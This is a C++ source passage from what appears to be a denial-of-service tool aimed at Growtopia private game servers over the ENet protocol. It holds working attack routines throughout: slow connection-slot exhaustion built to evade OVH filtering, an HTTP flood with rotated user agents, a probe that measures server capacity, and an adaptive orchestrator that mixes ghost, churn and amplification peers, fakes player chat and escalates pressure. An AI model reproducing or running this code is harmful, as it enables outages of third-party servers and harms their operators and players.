                    ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, login.c_str(), len);
                    enet_peer_send(pi.peer, 0, pkt);
                }
                g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
                active_count++;
                if (active_count > peak_active) peak_active = active_count;
                break;

            case ENET_EVENT_TYPE_RECEIVE:
                if (evt.packet && evt.packet->dataLength >= 4) {
                    uint8_t mt = ((uint8_t*)evt.packet->data)[0];
                    const char* txt = (evt.packet->dataLength > 4)
                        ? (const char*)evt.packet->data + 4 : "";

                    if (pi.state == P_LOGIN && mt == NET_MESSAGE_GENERIC_TEXT) {
                        // Login response received
                        if (cfg.ghost_after == "login") {
                            pi.state = P_IDLE;
                        } else {
                            pi.state = P_LOBBY;
                        }
                        pi.state_t = now_ms();
                    }
                    if (pi.state == P_JOINING &&
                        (strstr(txt, "action|spawn") || strstr(txt, "OnSpawn"))) {
                        pi.state = P_IDLE;
                        pi.state_t = now_ms();
                        g_stats[tid]->world_joins.fetch_add(1, std::memory_order_relaxed);
                        g_clients_in_world.fetch_add(1, std::memory_order_relaxed);
                    }
                }
                if (evt.packet) enet_packet_destroy(evt.packet);
                break;

            case ENET_EVENT_TYPE_DISCONNECT:
                if (pi.state == P_IDLE)
                    g_clients_in_world.fetch_sub(1, std::memory_order_relaxed);
                pi.state = P_DEAD;
                pi.state_t = now_ms();
                pi.peer = nullptr;
                active_count--;
                break;

            case ENET_EVENT_TYPE_NONE: break;
            }
        }

        int64_t now = now_ms();

        // Process state machine for all peers
        for (int i = 0; i < n_peers; i++) {
            PeerInfo& pi = peers[i];
            switch (pi.state) {
            case P_LOBBY:
                if (now - pi.state_t > 300) {
                    char buf[64];
                    int len = snprintf(buf, sizeof(buf),
                        "action|join_request\nname|%s\n", cfg.world.c_str());
                    if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
                    ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, buf, len);
                    enet_peer_send(pi.peer, 0, pkt);
                    pi.state = P_JOINING;
                    pi.state_t = now;
                    g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
                }
                break;

            case P_IDLE:
                // AFK mimicry
                if (cfg.mimic_player && pi.peer && (rng() % 200) == 0) {
                    mimic_afk_activity(pi.peer, rng);
                }
                break;

            case P_DEAD:
                // Auto-reconnect after random delay
                if (now - pi.state_t > 2000 + (int)(rng() % 5000)) {
                    pi.name = cfg.randomize_names ? generate_random_name(rng) : pi.name;
                    pi.peer = enet_host_connect(host, &addr, 2, 0);
                    if (pi.peer) {
                        enet_peer_timeout(pi.peer, 0, 30000, 120000);
                        pi.state = P_CONNECTING;
                        pi.state_t = now;
                        reconnect_count++;
                    }
                }
                break;

            case P_CONNECTING:
                if (now - pi.state_t > 10000) { pi.state = P_DEAD; pi.state_t = now; }
                break;
            case P_JOINING:
                if (now - pi.state_t > 5000) { pi.state = P_LOBBY; pi.state_t = now; }
                break;
            default: break;
            }
        }

        stealth_jitter(cfg.jitter_ms / 2, rng);
    }

    // Cleanup
    for (auto& pi : peers) {
        if (pi.peer) enet_peer_disconnect_now(pi.peer, 0);
    }
    enet_host_flush(host);
    enet_host_destroy(host);
    printf("[mpeer t%d] exit  peak_active=%d  reconnects=%d\n", tid, peak_active, reconnect_count);
}

// ============================================================================
// v7.2 M-SLOW: Slow accumulation — paling stealth, impossible to detect
//
// 1 koneksi baru setiap N detik (default 8s = ~7 koneksi/menit).
// Setiap koneksi: full login + join world + AFK.
// Tidak pernah disconnect sukarela. Accumulate selama berjam-jam.
// Dari sisi OVH: organic player growth yang sangat normal.
// ============================================================================

static void run_slow_accumulate(int tid, const Config& cfg) {
    int max_peers = std::max(1, cfg.peers_per_thread);
    ENetHost* host = enet_host_create(nullptr, max_peers, 2, 0, 0);
    if (!host) { fprintf(stderr, "[slow t%d] host_create(%d) failed\n", tid, max_peers); return; }

    ENetAddress addr{};
    enet_address_set_host(&addr, cfg.target.c_str());
    addr.port = cfg.port;

    std::mt19937 rng(std::random_device{}() ^ (tid * 53 + 11));

    enum SState { S_DEAD, S_CONNECTING, S_LOGIN, S_LOBBY, S_JOINING, S_IDLE };
    struct SlowPeer {
        ENetPeer* peer = nullptr;
        SState state = S_DEAD;
        int64_t state_t = 0;
        std::string name;
    };
    std::vector<SlowPeer> peers;
    peers.reserve(max_peers);

    int64_t last_add = 0;
    int total_added = 0;

    printf("[slow t%d] start  max_peers=%d  interval=%dms\n",
           tid, max_peers, cfg.slow_interval_ms);

    while (g_running.load()) {
        int64_t now = now_ms();

        // Add one new connection at slow rate (with jitter for stealth)
        int effective_interval = cfg.slow_interval_ms;
        if (cfg.jitter_ms > 0)
            effective_interval += (int)(rng() % (cfg.jitter_ms * 2)) - cfg.jitter_ms;
        effective_interval = std::max(1000, effective_interval);

        if ((int)peers.size() < max_peers && now - last_add >= effective_interval) {
            SlowPeer sp;
            sp.name = generate_random_name(rng);
            sp.peer = enet_host_connect(host, &addr, 2, 0);
            if (sp.peer) {
                enet_peer_timeout(sp.peer, 0, 30000, 120000);
                sp.state = S_CONNECTING;
                sp.state_t = now;
                peers.push_back(sp);
                total_added++;
                last_add = now;  // jitter handled by interval check naturally
            }
        }

        // Service all peers
        ENetEvent evt;
        while (enet_host_service(host, &evt, 10) > 0) {
            int pidx = -1;
            for (int i = 0; i < (int)peers.size(); i++) {
                if (peers[i].peer == evt.peer) { pidx = i; break; }
            }
            if (pidx < 0) { if (evt.packet) enet_packet_destroy(evt.packet); continue; }
            SlowPeer& sp = peers[pidx];

            switch (evt.type) {
            case ENET_EVENT_TYPE_CONNECT:
                sp.state = S_LOGIN; sp.state_t = now_ms();
                {
                    std::string login = build_login_packet(sp.name, rng);
                    int len = (int)login.size();
                    ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, login.c_str(), len);
                    enet_peer_send(sp.peer, 0, pkt);
                }
                g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
                break;
            case ENET_EVENT_TYPE_RECEIVE:
                if (evt.packet && evt.packet->dataLength >= 4) {
                    uint8_t mt = ((uint8_t*)evt.packet->data)[0];
                    const char* txt = (evt.packet->dataLength > 4)
                        ? (const char*)evt.packet->data + 4 : "";
                    if (sp.state == S_LOGIN && mt == NET_MESSAGE_GENERIC_TEXT) {
                        sp.state = S_LOBBY; sp.state_t = now_ms();
                    }
                    if (sp.state == S_JOINING &&
                        (strstr(txt, "action|spawn") || strstr(txt, "OnSpawn"))) {
                        sp.state = S_IDLE; sp.state_t = now_ms();
                        g_stats[tid]->world_joins.fetch_add(1, std::memory_order_relaxed);
                        g_clients_in_world.fetch_add(1, std::memory_order_relaxed);
                    }
                }
                if (evt.packet) enet_packet_destroy(evt.packet);
                break;
            case ENET_EVENT_TYPE_DISCONNECT:
                if (sp.state == S_IDLE) g_clients_in_world.fetch_sub(1, std::memory_order_relaxed);
                // Don't remove — reconnect in place
                sp.peer = nullptr; sp.state = S_DEAD; sp.state_t = now_ms();
                break;
            case ENET_EVENT_TYPE_NONE: break;
            }
        }

        // State machine for all peers
        int active = 0;
        for (auto& sp : peers) {
            now = now_ms();
            switch (sp.state) {
            case S_LOBBY:
                if (now - sp.state_t > 500) {
                    char buf[64];
                    int len = snprintf(buf, sizeof(buf),
                        "action|join_request\nname|%s\n", cfg.world.c_str());
                    if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
                    ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, buf, len);
                    enet_peer_send(sp.peer, 0, pkt);
                    sp.state = S_JOINING; sp.state_t = now;
                }
                break;
            case S_IDLE:
                active++;
                if (cfg.mimic_player && sp.peer && (rng() % 300) == 0)
                    mimic_afk_activity(sp.peer, rng);
                break;
            case S_DEAD:
                if (sp.peer == nullptr && now - sp.state_t > 3000 + (int)(rng() % 8000)) {
                    sp.name = generate_random_name(rng);
                    sp.peer = enet_host_connect(host, &addr, 2, 0);
                    if (sp.peer) {
                        enet_peer_timeout(sp.peer, 0, 30000, 120000);
                        sp.state = S_CONNECTING; sp.state_t = now;
                    }
                }
                break;
            case S_CONNECTING:
                if (now - sp.state_t > 10000) { sp.state = S_DEAD; sp.state_t = now; sp.peer = nullptr; }
                break;
            case S_JOINING:
                if (now - sp.state_t > 5000) { sp.state = S_LOBBY; sp.state_t = now; }
                break;
            default: break;
            }
        }

        // Print progress at milestones
        static thread_local int last_printed = 0;
        if (total_added > last_printed && total_added % 10 == 0) {
            int idle_count = 0;
            for (auto& sp : peers) if (sp.state == S_IDLE) idle_count++;
            printf("[slow t%d] peers=%zu  idle=%d  total_added=%d\n",
                   tid, peers.size(), idle_count, total_added);
            last_printed = total_added;
        }
    }

    for (auto& sp : peers) { if (sp.peer) enet_peer_disconnect_now(sp.peer, 0); }
    enet_host_flush(host);
    enet_host_destroy(host);
    printf("[slow t%d] exit  total_added=%d\n", tid, total_added);
}

// ============================================================================
// v7.2 HTTP Flood — Non-ENet method (100% work, tidak pakai game protocol)
//
// Kirim HTTP requests ke endpoint GTPS web server (port 80/443).
// Banyak GTPS (terutama GrowServer) punya HTTP endpoint untuk:
//   - Login/auth page
//   - Server status
//   - API endpoints
// OVH tidak bisa filter valid HTTP requests tanpa blokir web access.
// Tidak butuh libenet — pure TCP socket.
// ============================================================================

// ============================================================================
// v7.2 THRESHOLD: Auto-detect server capacity
//
// Gradually add connections until server starts rejecting.
// Reports exact threshold: "peer_limit: N connections"
// Uses multi-peer architecture. Only runs on thread 0.
// ============================================================================

static void run_threshold_detect(int tid, const Config& cfg) {
    if (tid != 0) return;  // Only one thread does this

    int max_test = std::max(1, cfg.peers_per_thread);
    ENetHost* host = enet_host_create(nullptr, max_test, 2, 0, 0);
    if (!host) { fprintf(stderr, "[threshold] host_create failed\n"); return; }

    ENetAddress addr{};
    enet_address_set_host(&addr, cfg.target.c_str());
    addr.port = cfg.port;

    std::mt19937 rng(std::random_device{}() ^ 0xDEAD);

    struct TPeer {
        ENetPeer* peer = nullptr;
        bool connected = false;
        bool failed = false;
    };

    std::vector<TPeer> peers;
    int batch_size = 10;
    int batch_wait_sec = 5;
    int total_connected = 0;
    int threshold = -1;

    printf("[threshold] start  max=%d  batch=%d  wait=%ds\n",
           max_test, batch_size, batch_wait_sec);

    while (g_running.load() && (int)peers.size() < max_test) {
        // Add a batch of connections
        int added = 0;
        for (int i = 0; i < batch_size && (int)peers.size() < max_test; i++) {
            TPeer tp;
            tp.peer = enet_host_connect(host, &addr, 2, 0);
            if (tp.peer) {
                enet_peer_timeout(tp.peer, 0, 8000, 15000);
                peers.push_back(tp);
                added++;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

        // Wait and service for batch_wait_sec
        int batch_ok = 0, batch_fail = 0;
        auto wait_end = std::chrono::steady_clock::now() +
                        std::chrono::seconds(batch_wait_sec);

        while (std::chrono::steady_clock::now() < wait_end && g_running.load()) {
            ENetEvent evt;
            while (enet_host_service(host, &evt, 100) > 0) {
                for (auto& tp : peers) {
                    if (tp.peer == evt.peer) {
                        if (evt.type == ENET_EVENT_TYPE_CONNECT) {
                            tp.connected = true;
                            // Send login
                            std::string name = generate_random_name(rng);
                            std::string login = build_login_packet(name, rng);
                            int len = (int)login.size();
                            ENetPacket* pkt = enet_packet_create(nullptr, len + 4,
                                                                 ENET_PACKET_FLAG_RELIABLE);
                            ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                            memset((uint8_t*)pkt->data + 1, 0, 3);
                            memcpy((uint8_t*)pkt->data + 4, login.c_str(), len);
                            enet_peer_send(tp.peer, 0, pkt);
                        }
                        if (evt.type == ENET_EVENT_TYPE_DISCONNECT) {
                            tp.connected = false;
                            tp.failed = true;
                            tp.peer = nullptr;
                        }
                        break;
                    }
                }
                if (evt.packet) enet_packet_destroy(evt.packet);
            }
        }

        // Count results for this batch
        for (auto& tp : peers) {
            if (tp.connected) batch_ok++;
            if (tp.failed || (!tp.connected && tp.peer)) batch_fail++;
        }
        total_connected = batch_ok;

        float fail_rate = (float)batch_fail / std::max(1, (int)peers.size()) * 100.0f;

        printf("[threshold] peers=%zu  connected=%d  failed=%d  fail_rate=%.1f%%\n",
               peers.size(), batch_ok, batch_fail, fail_rate);

        g_stats[0]->packets_sent.store(peers.size(), std::memory_order_relaxed);

        // Threshold detected: fail rate > 20%
        if (fail_rate > 20.0f && threshold < 0) {
            threshold = total_connected;
            printf("\n[threshold] *** DETECTED: server limit ≈ %d connections ***\n\n", threshold);
            // Continue a bit more to confirm
        }

        // Confirmed: fail rate > 50%, stop
        if (fail_rate > 50.0f) {
            printf("[threshold] confirmed  limit=%d  (>50%% failing)\n", threshold);
            break;
        }
    }

    if (threshold < 0) {
        printf("[threshold] limit NOT reached (tested up to %zu connections)\n", peers.size());
        threshold = (int)peers.size();
    }

    printf("\n=== THRESHOLD RESULT ===\n");
    printf("peer_saturation_threshold: %d\n", threshold);
    printf("max_tested: %zu\n", peers.size());
    printf("========================\n");

    for (auto& tp : peers) { if (tp.peer) enet_peer_disconnect_now(tp.peer, 0); }
    enet_host_flush(host);
    enet_host_destroy(host);
}

static void run_http_flood(int tid, const Config& cfg) {
    if (cfg.http_target.empty()) {
        fprintf(stderr, "[http t%d] --http-target URL required\n", tid);
        return;
    }

    // Parse URL: http://host:port/path
    std::string url = cfg.http_target;
    std::string host_str, path_str = "/";
    int port = 80;
    bool use_https = false;

    if (url.substr(0, 8) == "https://") { use_https = true; port = 443; url = url.substr(8); }
    else if (url.substr(0, 7) == "http://") { url = url.substr(7); }

    auto slash = url.find('/');
    if (slash != std::string::npos) { path_str = url.substr(slash); host_str = url.substr(0, slash); }
    else { host_str = url; }

    auto colon = host_str.find(':');
    if (colon != std::string::npos) {
        port = std::stoi(host_str.substr(colon + 1));
        host_str = host_str.substr(0, colon);
    }

    std::mt19937 rng(std::random_device{}() ^ (tid * 67));

    // Randomized User-Agent list
    static const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        "Growtopia/3.98 (Windows; en-US)",
        "Growtopia/3.98 (Android; en-US)",
    };

    int rps = std::max(1, cfg.http_rps);
    int sleep_us = 1000000 / rps;

    printf("[http t%d] start  target=%s:%d%s  rps=%d  https=%s\n",
           tid, host_str.c_str(), port, path_str.c_str(), rps, use_https ? "yes" : "no");

    if (use_https) {
        printf("[http t%d] WARNING: HTTPS not implemented in raw socket mode. Use HTTP or implement with libcurl.\n", tid);
        return;
    }

    // Resolve hostname (supports both IP and domain names)
    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    if (inet_pton(AF_INET, host_str.c_str(), &dst.sin_addr) != 1) {
        // Not a raw IP — try DNS resolution
        struct addrinfo hints{}, *res = nullptr;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        int err = getaddrinfo(host_str.c_str(), nullptr, &hints, &res);
        if (err != 0 || !res) {
            fprintf(stderr, "[http t%d] DNS resolve failed for '%s': %s\n",
                    tid, host_str.c_str(), gai_strerror(err));
            return;
        }
        dst.sin_addr = ((sockaddr_in*)res->ai_addr)->sin_addr;
        freeaddrinfo(res);
        char resolved[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &dst.sin_addr, resolved, sizeof(resolved));
        printf("[http t%d] resolved %s → %s\n", tid, host_str.c_str(), resolved);
    }

    while (g_running.load()) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) { g_stats[tid]->errors.fetch_add(1, std::memory_order_relaxed); continue; }

        // Set timeout
        struct timeval tv{2, 0};
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        if (connect(fd, (sockaddr*)&dst, sizeof(dst)) < 0) {
            close(fd);
            g_stats[tid]->errors.fetch_add(1, std::memory_order_relaxed);
            stealth_jitter(cfg.jitter_ms, rng);
            continue;
        }

        // Build HTTP request with randomized headers
        const char* ua = user_agents[rng() % 6];
        char req[512];
        int reqlen = snprintf(req, sizeof(req),
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: text/html,*/*\r\n"
            "Connection: close\r\n"
            "X-Request-ID: %08x\r\n"
            "\r\n",
            path_str.c_str(), host_str.c_str(), ua, (unsigned int)rng());
        if (reqlen < 0 || reqlen >= (int)sizeof(req)) reqlen = (int)sizeof(req) - 1;

        ssize_t sent = send(fd, req, reqlen, 0);
        if (sent > 0) {
            g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
            g_stats[tid]->bytes_sent.fetch_add(sent, std::memory_order_relaxed);

            // Read response (partial, just to see status)
            char rbuf[256];
            ssize_t rx = recv(fd, rbuf, sizeof(rbuf) - 1, 0);
            if (rx > 0) {
                g_stats[tid]->rtt_samples.fetch_add(1, std::memory_order_relaxed);
            }
        } else {
            g_stats[tid]->errors.fetch_add(1, std::memory_order_relaxed);
        }

        close(fd);

        // Rate limit with jitter
        int sleep = sleep_us;
        if (cfg.jitter_ms > 0) {
            sleep += ((int)(rng() % (cfg.jitter_ms * 2000)) - cfg.jitter_ms * 1000);
            sleep = std::max(1000, sleep);
        }
        std::this_thread::sleep_for(std::chrono::microseconds(sleep));
    }

    printf("[http t%d] done  requests=%lu  responses=%lu  errors=%lu\n",
           tid,
           g_stats[tid]->packets_sent.load(),
           g_stats[tid]->rtt_samples.load(),
           g_stats[tid]->errors.load());
}

// ============================================================================
// v10: MULTI-VECTOR ORCHESTRATOR
//
// Central connection pool with dynamic role assignment.
// Instead of separate attack methods, ONE pool of peers where each
// peer can be reassigned roles (ghost/churn/amp/player) on the fly.
//
// Orchestrator monitors canary & slt-monitor, adapts vector allocation.
// ============================================================================

enum class PeerRole {
    GHOST,         // sit idle, occupy peer slot
    CHURN,         // join/quit worlds rapidly (CPU stress)
    AMP_BURST,     // tile burst sender (broadcast amplification)
    AMP_CROWD,     // sit in world as receiver (amplification target)
    AUTH_CYCLE,    // connect → login → disconnect → repeat
    PLAYER,        // full gameplay simulation (hardest to detect)
    DEAD,          // disconnected, pending reconnect
    CONNECTING,    // handshake in progress
    LOGIN,         // login sent, waiting response
    JOINING,       // join_request sent, waiting spawn
};

struct ManagedPeer {
    ENetPeer*   peer       = nullptr;
    PeerRole    role       = PeerRole::DEAD;
    PeerRole    target_role = PeerRole::GHOST;  // what orchestrator wants
    int64_t     state_t    = 0;
    int64_t     last_action = 0;
    int         world_idx  = 0;
    int         action_count = 0;
    int         session_remaining_sec = 0;  // lifecycle: when to disconnect
    std::string name;

    bool is_alive() const {
        return role != PeerRole::DEAD && role != PeerRole::CONNECTING;
    }
    bool is_in_world() const {
        return role == PeerRole::GHOST || role == PeerRole::CHURN ||
               role == PeerRole::AMP_BURST || role == PeerRole::AMP_CROWD ||
               role == PeerRole::PLAYER;
    }
};

struct RoleAllocation {
    int ghost_pct    = 40;
    int churn_pct    = 30;
    int amp_pct      = 20;  // split: 30% burst, 70% crowd
    int player_pct   = 10;
    // auth_cycle is handled separately (reconnect cycling)
};

// Parse "ghost:40,churn:30,amp:20,player:10" → RoleAllocation
static RoleAllocation parse_roles(const std::string& s) {
    RoleAllocation ra{};
    if (s.empty()) return ra;
    // Reset to 0
    ra.ghost_pct = ra.churn_pct = ra.amp_pct = ra.player_pct = 0;
    std::istringstream ss(s);
    std::string tok;
    while (std::getline(ss, tok, ',')) {
        auto colon = tok.find(':');
        if (colon == std::string::npos) continue;
        std::string key = tok.substr(0, colon);
        int val = 0;
        try { val = std::stoi(tok.substr(colon + 1)); } catch (...) { continue; }
        if (key == "ghost")  ra.ghost_pct = val;
        else if (key == "churn")  ra.churn_pct = val;
        else if (key == "amp")    ra.amp_pct = val;
        else if (key == "player") ra.player_pct = val;
    }
    return ra;
}

// Assign target_role to peers based on allocation percentages
static void assign_roles(std::vector<ManagedPeer>& peers, const RoleAllocation& ra) {
    int n = (int)peers.size();
    int n_ghost  = n * ra.ghost_pct / 100;
    int n_churn  = n * ra.churn_pct / 100;
    int n_amp    = n * ra.amp_pct / 100;
    int n_burst  = std::max(1, n_amp * 30 / 100);
    int n_crowd  = n_amp - n_burst;
    // remaining peers (idx after all explicit roles) get PLAYER role
    int idx = 0;
    for (int i = 0; i < n_ghost && idx < n; i++, idx++)
        peers[idx].target_role = PeerRole::GHOST;
    for (int i = 0; i < n_churn && idx < n; i++, idx++)
        peers[idx].target_role = PeerRole::CHURN;
    for (int i = 0; i < n_burst && idx < n; i++, idx++)
        peers[idx].target_role = PeerRole::AMP_BURST;
    for (int i = 0; i < n_crowd && idx < n; i++, idx++)
        peers[idx].target_role = PeerRole::AMP_CROWD;
    for (; idx < n; idx++)
        peers[idx].target_role = PeerRole::PLAYER;
}

// ============================================================================
// Phase 3: Scenario file parser
//
// INI format:
//   [phase:ramp_up]
//   duration = 60
//   roles = ghost:60,churn:20,amp:10,player:10
//
//   [phase:pressure]
//   duration = 120
//   roles = ghost:20,churn:40,amp:30,player:10
// ============================================================================

struct MVScenarioPhase {
    std::string name;
    int duration_sec = 60;
    RoleAllocation roles;
};

static std::vector<MVScenarioPhase> parse_scenario_file(const std::string& path) {
    std::vector<MVScenarioPhase> phases;
    std::ifstream f(path);
    if (!f.is_open()) {
        fprintf(stderr, "[scenario] cannot open '%s'\n", path.c_str());
        return phases;
    }
    MVScenarioPhase current;
    bool in_phase = false;
    std::string line;
    while (std::getline(f, line)) {
        // Trim
        while (!line.empty() && (line[0] == ' ' || line[0] == '\t')) line.erase(0, 1);
        if (line.empty() || line[0] == '#' || line[0] == ';') continue;

        if (line[0] == '[') {
            // New section
            if (in_phase) phases.push_back(current);
            current = MVScenarioPhase{};
            auto end = line.find(']');
            std::string section = line.substr(1, end - 1);
            if (section.substr(0, 6) == "phase:") {
                current.name = section.substr(6);
                in_phase = true;
            } else {
                in_phase = false;
            }
        } else if (in_phase) {
            auto eq = line.find('=');
            if (eq == std::string::npos) continue;
            std::string key = line.substr(0, eq);
            std::string val = line.substr(eq + 1);
            while (!key.empty() && key.back() == ' ') key.pop_back();
            while (!val.empty() && val[0] == ' ') val.erase(0, 1);

            if (key == "duration") {
                try { current.duration_sec = std::stoi(val); } catch (...) {}
            }
            else if (key == "roles") current.roles = parse_roles(val);
        }
    }
    if (in_phase) phases.push_back(current);
    printf("[scenario] loaded %zu phases from '%s'\n", phases.size(), path.c_str());
    return phases;
}

// ============================================================================
// Phase 4: Adaptive engine — internal canary probe
//
// Runs inside orchestrator, periodically probes server to measure health.
// Adjusts role allocation based on server response.
// ============================================================================

struct AdaptiveState {
    int  probe_interval_sec = 10;
    int64_t last_probe      = 0;
    int  consecutive_ok     = 0;
    int  consecutive_fail   = 0;
    bool server_stressed    = false;
    int  escalation_level   = 0;  // 0=normal, 1=moderate, 2=heavy, 3=max

    // Decide role adjustment based on probe results
    RoleAllocation adjust(const RoleAllocation& base, bool probe_ok, int connect_fail_pct) {
        RoleAllocation adj = base;

        if (probe_ok && connect_fail_pct < 10) {
            consecutive_ok++;
            consecutive_fail = 0;
            // Server handling fine → escalate pressure
            if (consecutive_ok >= 3 && escalation_level < 3) {
                escalation_level++;
                printf("[adaptive] escalating to level %d (server OK)\n", escalation_level);
                consecutive_ok = 0;
            }
        } else {
            consecutive_fail++;
            consecutive_ok = 0;
            server_stressed = true;
            printf("[adaptive] server stressed (fail_pct=%d%%)\n", connect_fail_pct);
        }

        // Adjust based on escalation level
        switch (escalation_level) {
        case 0: // Conservative
            adj.ghost_pct = 60; adj.churn_pct = 20; adj.amp_pct = 10; adj.player_pct = 10;
            break;
        case 1: // Moderate
            adj.ghost_pct = 40; adj.churn_pct = 30; adj.amp_pct = 20; adj.player_pct = 10;
            break;
        case 2: // Heavy
            adj.ghost_pct = 20; adj.churn_pct = 40; adj.amp_pct = 30; adj.player_pct = 10;
            break;
        case 3: // Maximum pressure
            adj.ghost_pct = 10; adj.churn_pct = 40; adj.amp_pct = 40; adj.player_pct = 10;
            break;
        }

        // If connections failing → shift away from ghost (need existing conns, not new ones)
        if (connect_fail_pct > 30) {
            adj.ghost_pct = 5;
            adj.churn_pct = 50;
            adj.amp_pct = 40;
            adj.player_pct = 5;
            printf("[adaptive] peer table likely full, shifting to churn+amp\n");
        }

        return adj;
    }
};

static void run_orchestrator(int tid, const Config& cfg) {
    int n_peers = std::max(1, cfg.peers_per_thread);
    ENetHost* host = enet_host_create(nullptr, n_peers, 2, 0, 0);
    if (!host) { fprintf(stderr, "[orch t%d] host_create(%d) failed\n", tid, n_peers); return; }

    ENetAddress addr{};
    enet_address_set_host(&addr, cfg.target.c_str());
    addr.port = cfg.port;

    std::mt19937 rng(std::random_device{}() ^ (tid * 71 + 13));

    std::vector<ManagedPeer> peers(n_peers);

    // Parse role allocation
    RoleAllocation roles = parse_roles(cfg.scenario_roles);
    assign_roles(peers, roles);

    // Phase 3: Load scenario phases if provided
    std::vector<MVScenarioPhase> scenario;
    int current_phase_idx = 0;
    int64_t phase_start_t = now_ms();
    if (!cfg.mv_scenario_file.empty()) {
        scenario = parse_scenario_file(cfg.mv_scenario_file);
        if (!scenario.empty()) {
            roles = scenario[0].roles;
            assign_roles(peers, roles);
            printf("[orch t%d] scenario phase 1/%zu: '%s' (%ds)\n",
                   tid, scenario.size(), scenario[0].name.c_str(), scenario[0].duration_sec);
        }
    }

    // Phase 4: Adaptive engine state
    AdaptiveState adaptive;
    int connect_attempts = 0;
    int connect_failures = 0;

    // Chat messages for PLAYER role — large pool for variety
    static const char* chat_msgs[] = {
        "anyone trading?", "nice farm", "whos world?", "buying chand offer",
        "wl pls", "gg", "brb", "hi", "can i farm here?", "ty",
        "selling lens offer", "drop game?", "how much?", "nty",
        "lol", "wow", "cool world", "first time here", "lag?",
        "add me", "visit my world", "free items?", "trade?",
        "what level?", "nice bro", "where buy?", "thx",
        "anyone here?", "hello", "sup", "yo",
        "buying dl", "selling wl", "overpay?", "pm me",
        "good luck", "cya", "gtg", "back",
        "lf team", "help pls", "noob", "pro",
        "rip", "xd", "ez", "oof", "haha",
        "anyone want to farm?", "lets trade", "show me",
    };
    int n_chats = sizeof(chat_msgs) / sizeof(chat_msgs[0]);

    // Item IDs for realistic farming simulation
    static const uint32_t farm_items[] = {
        18,   // fist (punch)
        32,   // wrench
        242,  // sign
        3058, // pepper
        4584, // lgrid
        5640, // chandelier
    };

    // Staggered ramp-up
    int ramp_ms = cfg.ramp_sec * 1000;
    int connect_interval = (ramp_ms > 0) ? std::max(10, ramp_ms / n_peers) : 50;
    int64_t last_connect = 0;
    int next_connect_idx = 0;

    // Role rotation tracking
    int64_t last_rotate = now_ms();
    int rotate_idx = 0;

    // Stats
    int peak_alive = 0;
    int total_reconnects = 0;

    printf("[orch t%d] start  peers=%d  roles=ghost:%d%%,churn:%d%%,amp:%d%%,player:%d%%  ramp=%ds\n",
           tid, n_peers, roles.ghost_pct, roles.churn_pct, roles.amp_pct, roles.player_pct,
           cfg.ramp_sec);

    while (g_running.load()) {
        int64_t now = now_ms();

        // === RAMP: gradually connect peers ===
        if (next_connect_idx < n_peers && now - last_connect >= connect_interval) {
            ManagedPeer& mp = peers[next_connect_idx];
            mp.peer = enet_host_connect(host, &addr, 2, 0);
            if (mp.peer) {
                enet_peer_timeout(mp.peer, 0, 30000, 120000);
                mp.role = PeerRole::CONNECTING;
                mp.state_t = now;
                mp.name = generate_random_name(rng);
                mp.session_remaining_sec = 600 + (int)(rng() % 2400);  // 10-50 min session
            }
            last_connect = now;
            next_connect_idx++;
        }

        // === SERVICE ENet ===
        ENetEvent evt;
        while (enet_host_service(host, &evt, 5) > 0) {
            int pidx = -1;
            for (int i = 0; i < n_peers; i++)
                if (peers[i].peer == evt.peer) { pidx = i; break; }
            if (pidx < 0) { if (evt.packet) enet_packet_destroy(evt.packet); continue; }
            ManagedPeer& mp = peers[pidx];

            switch (evt.type) {
            case ENET_EVENT_TYPE_CONNECT:
                mp.role = PeerRole::LOGIN;
                mp.state_t = now_ms();
                {
                    std::string login = build_login_packet(mp.name, rng);
                    int len = (int)login.size();
                    ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, login.c_str(), len);
                    enet_peer_send(mp.peer, 0, pkt);
                }
